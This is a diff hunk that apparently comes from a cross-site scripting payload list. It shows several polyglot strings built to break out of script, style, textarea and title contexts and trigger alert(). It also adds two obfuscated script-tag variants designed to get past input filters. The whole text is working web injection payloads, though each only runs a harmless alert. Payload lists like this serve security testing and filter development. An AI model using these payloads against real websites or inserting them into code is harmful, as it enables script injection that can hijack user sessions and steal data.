@@ -175,4 +175,5 @@ javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert(
 /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
 javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
-
+<%%%script>alert(1);<%%%/script>
+<""script>alert(1)</""script>
